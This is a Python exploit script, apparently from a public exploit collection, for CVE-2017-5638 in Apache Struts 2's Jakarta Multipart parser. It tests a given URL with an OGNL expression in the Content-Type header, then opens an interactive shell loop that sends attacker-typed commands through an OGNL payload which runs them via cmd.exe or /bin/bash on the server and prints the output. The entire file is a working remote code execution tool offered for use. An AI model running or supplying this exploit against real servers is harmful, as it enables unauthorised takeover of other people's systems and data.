#!/usr/bin/python3
# coding:utf-8
# author(cn):之乎者也
# author(en):zhzyker
# from:https://github.com/zhzyker/exphub
# telegram:t.me/zhzyker
# qq(群):219291257

import requests
import sys
import re

if len(sys.argv)!=2:
    print('+-------------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub              +')
    print('+                    https://freeerror.org/d/490                    +')
    print('+      CVE-2017-5638 Jakarta Multipart parser 插件远程命令执行漏洞  +')
    print('+-------------------------------------------------------------------+')
    print('+ USE: python3 <filename> <url>                                     +')
    print('+ EXP: python3 struts2-045_cmd.py http://freeerror.org/login.action +')
    print('+ VER: Struts 2.3.5 – Struts 2.3.31                                 +')
    print('+      Struts 2.5.0 – Struts 2.5.10                                 +')
    print('+-------------------------------------------------------------------+')
    sys.exit()
url = sys.argv[1]
cmd = "whoami"
TMOUT = 10

headers_payload = {
    "Content-Type":'${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("testpoc",233*233)}.multipart/form-data'
    }
try:
    r = requests.get(url, headers=headers_payload, timeout=TMOUT, verify=False)
    testpoc = r.headers['testpoc']
except:
    print ("[-] Target "+url+" Not Vuln!!! Good Luck\n")
    exit()
if testpoc == '54289':
    print ("[+] Target "+url+" Find Vuln!!!\n")

def do_exp(cmd):
    headers_payload = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "Content-Type":"%{(#dm='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
        }
    r = requests.get(url, headers=headers_payload, timeout=TMOUT, verify=False)
    print (r.text)

while 1:
    cmd = input("Shell >>> ")
    if cmd == "exit" : exit(0)
    do_exp(cmd)
